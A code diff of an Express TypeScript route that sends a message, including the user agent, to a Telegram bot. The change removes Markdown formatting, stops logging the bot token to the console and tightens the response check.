@@ -53,24 +53,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
 ${userInfo.userAgent}
       `;
       
-      // Send to Telegram
+      // Send to Telegram - without parse_mode to avoid formatting errors
       const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      console.log("Sending to Telegram:", { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID });
+      console.log("Sending to Telegram with verified credentials");
       
       const response = await fetch(telegramUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: "Markdown"
+          text: message
         })
       });
       
       const responseData = await response.json();
       console.log("Telegram API response:", responseData);
       
-      if (!responseData.ok) {
+      if (responseData && typeof responseData === 'object' && 'ok' in responseData && !responseData.ok) {
         console.error("Telegram API error:", responseData.description);
         throw new Error(`Telegram API error: ${responseData.description}`);
       }
